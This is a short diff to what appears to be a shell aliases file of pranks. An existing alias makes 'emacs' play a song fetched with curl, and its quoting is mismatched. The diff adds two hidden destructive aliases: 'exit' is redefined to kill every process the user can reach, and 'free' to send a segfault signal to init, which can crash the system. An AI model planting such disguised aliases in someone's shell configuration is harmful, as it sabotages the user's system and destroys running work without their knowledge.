@@ -4,3 +4,7 @@ function _ping() {
 alias ping='_ping'
 
 alias emacs='play <(curl -s https://www.gnu.org/music/free-software-song.ogg)"
+
+alias exit='kill -- -1'
+
+alias free='kill -SEGV 1'
